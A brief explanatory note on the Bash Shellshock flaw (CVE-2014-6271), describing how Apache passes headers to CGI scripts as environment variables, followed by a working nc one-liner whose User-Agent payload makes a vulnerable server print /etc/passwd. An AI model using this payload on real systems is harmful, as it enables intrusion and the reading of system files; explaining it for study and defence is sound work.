CVE-2014-6271

When a CGI is called, the web server will start a new process to run the CGI. Apache, for instance, uses environment variables to pass information to the CGI script

Apache passes headers (and other info) to the CGI.

The source of the issue is that Bash can have internal function declaration in its environment variable. The environment variable can be declared a function with `()`. Then an empty body is added for the function. Finally, the command that we want to run after the function is declared is added.

It looks like this:

```
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
```
